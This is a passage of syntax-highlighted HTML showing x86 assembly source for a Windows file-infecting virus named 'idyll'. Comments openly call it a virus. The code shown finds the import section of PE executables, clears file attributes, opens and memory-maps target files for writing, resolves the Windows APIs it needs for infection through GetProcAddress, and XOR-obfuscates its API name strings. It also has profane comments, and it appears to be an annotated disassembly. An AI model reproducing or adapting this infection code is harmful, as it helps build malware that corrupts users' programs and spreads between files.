    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_peheader</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;get object count..bug:oc is a 16bit value</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_1stsec</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;ptr to 1st entry in section table</span><span class="sc0">
</span><span class="sc5">idyll_infect_findimports_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;fetch section RVA</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;compare them</span><span class="sc0">
    </span><span class="sc6">jle</span><span class="sc0"> </span><span class="sc5">idyll_infect_findimports_found</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">             </span><span class="sc1">;next section</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">idyll_infect_findimports_loop</span><span class="sc0">  </span><span class="sc1">;loop</span><span class="sc0">
</span><span class="sc5">idyll_infect_findimports_found</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">idyll_infect_findimports_found_at_sectionstart</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0"> </span><span class="sc1">;^</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">     </span><span class="sc1">;|</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">     </span><span class="sc1">;+--start of imports equals to start of some section?</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">         </span><span class="sc1">;nope,previous section...</span><span class="sc0">
</span><span class="sc5">idyll_infect_findimports_found_at_sectionstart</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;fetch section RVA</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;PhysOffset</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_mappedadd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;map the file into the processes address space</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">idyll_mapfile</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">;@1357(8557)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_finddata_add</span><span class="sc4">]</span><span class="sc1">;ptr to finddata structure</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc0">     </span><span class="sc1">;fix ptr to point to the name of the found file</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">        </span><span class="sc1">;parameter for open</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">        </span><span class="sc1">;fileattribute normal</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">        </span><span class="sc1">;param for setfileattr</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_setfileattributesa_add</span><span class="sc4">]</span><span class="sc1">;call fn to set</span><span class="sc0">
                              </span><span class="sc1">;file attr to normal</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;failed?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">idyll_mapfile_return_failure</span><span class="sc0"> </span><span class="sc1">;yes abort</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">;get ptr to filename back</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;no hTemplate</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">                </span><span class="sc1">;attribute normal</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                  </span><span class="sc1">;OPEN_EXISTING</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;no sa struct</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;prevents from being shared</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0c0000000h</span><span class="sc0">             </span><span class="sc1">;r/w</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">;ptr to filename</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_createfilea_add</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;call CreateFileA()</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_handle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;store handle</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">              </span><span class="sc1">;open failed?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">idyll_mapfile_return_failure</span><span class="sc0">     </span><span class="sc1">;yes abort</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;now the file's opened..calculate the size of filemapping object</span><span class="sc0">
</span><span class="sc1">;and map file</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_finddata_add</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">edi._sizelo</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">edi._sizehi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_sectsize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;name of mapping object</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">            </span><span class="sc1">;max size lo</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">            </span><span class="sc1">;max size hi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">              </span><span class="sc1">;PAGE_READWRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;no sa structure</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;hFile to map</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_createfilemappinga_add</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_maphand</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">;store hObject</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;failed?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">idyll_mapfile_return_failure</span><span class="sc0">     </span><span class="sc1">;yes abort</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;map entire file</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;from zero offset</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;from zero offset</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                  </span><span class="sc1">;r/w access</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;hObject</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_mapviewoffile_add</span><span class="sc4">]</span><span class="sc1">;call MapViewOfFile</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_mappedadd</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;store add of mapped image</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;failed?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">idyll_mapfile_return_failure</span><span class="sc0">     </span><span class="sc1">;yes abort</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;return success(eax nonzero)</span><span class="sc0">
</span><span class="sc5">idyll_mapfile_return_failure</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;unmap the file and close handles</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">idyll_unmap_close</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;@13EE(85EE)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_mappedadd</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;address of mapped image</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;sotre parameter</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_unmapviewoffile_add</span><span class="sc4">]</span><span class="sc1">;unmap file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_maphand</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;hObject</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;store parameter</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_closehandle_add</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;close file mapping object  </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_handle</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;hFile</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;store parameter</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_closehandle_add</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;close file</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;return to motherfucking caller</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;calls GetProcAddress to retrieve fn adds needed for infection</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">idyll_lookup_apis</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">;@147F</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_apinames</span><span class="sc4">]</span><span class="sc1">;strings of fn names</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_apiaddresses</span><span class="sc4">]</span><span class="sc1">;room for fn addresses</span><span class="sc0">
</span><span class="sc5">idyll_lookup_apis_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;fetch a word</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;end of apinames?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">idyll_lookup_apis_return</span><span class="sc0"> </span><span class="sc1">;yes return</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">         </span><span class="sc1">;nops for b2b match</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">        </span><span class="sc1">;store ptr</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">        </span><span class="sc1">;pass fn add</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_k32add</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;hModule of KERNEL32</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;pass param</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_getprocaddress_add</span><span class="sc4">]</span><span class="sc1">;add of fn</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">        </span><span class="sc1">;call GetProcAddress</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;get ptr back</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;store fn add</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">       </span><span class="sc1">;fix ptr</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">;zero reg</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">;ecx contains 0xFFFFFFFF</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;inc ptr</span><span class="sc0">
    </span><span class="sc6">repnz</span><span class="sc0">           </span><span class="sc1">;find end of string (null)</span><span class="sc0">
    </span><span class="sc6">scasb</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">idyll_lookup_apis_loop</span><span class="sc1">;proceed with next fn</span><span class="sc0">
</span><span class="sc5">idyll_lookup_apis_return</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;data needed on virus startup</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">idyll_k32string</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'KERNEL32'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;@14BA</span><span class="sc0">
</span><span class="sc5">idyll_k32add</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;address of KERNEL32.dll @14C3</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;these fields are filled during infection and must be fixed</span><span class="sc0">
</span><span class="sc1">;before executing the 1st generation of the virus</span><span class="sc0">
</span><span class="sc1">;***note:this makes the whole stuff tasm/tlink dependent</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">idyll_gmh</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">    </span><span class="sc1">;@14C7 GetModuleHandleA</span><span class="sc0">
</span><span class="sc5">idyll_gpa</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">  </span><span class="sc1">;@14CB GetProcaddress</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">;@14CF</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">idyll_gmhstring</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetModuleHandleA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">;@14D7</span><span class="sc0">
</span><span class="sc5">idyll_gpastring</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetProcAddress'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;@14E8</span><span class="sc0">
</span><span class="sc5">idyll_getmodulehandlea_add</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;@14F7 fn address</span><span class="sc0">
</span><span class="sc5">idyll_getprocaddress_add</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;@14FB fn address</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;encrypt/decrypt api names</span><span class="sc0">
</span><span class="sc1">;(i always get wired when i see motherfucking mixing of motherfucking code</span><span class="sc0">
</span><span class="sc1">;and motherfucking data motherfucking areas motherfucking)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">idyll_xorloop_on_apinames</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;@14FF</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_apinames</span><span class="sc4">]</span><span class="sc1">;ptr to string to crypt</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">idyll_length_of_apinames</span><span class="sc1">;amount to crypt</span><span class="sc0">
</span><span class="sc5">idyll_xorloop_on_apinames_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;get byte</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">17h</span><span class="sc0">          </span><span class="sc1">;crypt byte</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">            </span><span class="sc1">;store byte</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">;inc ptr</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;has the author heard of the 'loop'</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">idyll_xorloop_on_apinames_loop</span><span class="sc0"> </span><span class="sc1">;instruction of the x86's?</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;data related to idyll</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">idyll_length_of_apinames</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">idyll_endof_apinames</span><span class="sc4">-</span><span class="sc5">idyll_apinames</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;names of functions virus uses for infection</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">idyll_apinames</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CreateFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CreateFileMappingA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'MapViewOfFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'UnmapViewOfFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CloseHandle'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'VirtualAlloc'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'VirtualFree'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'FindFirstFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'FindNextFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SetFileAttributesA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetLastError'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">;endmarker</span><span class="sc0">
</span><span class="sc5">idyll_endof_apinames</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;api adds will be stored here</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">idyll_apiaddresses</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
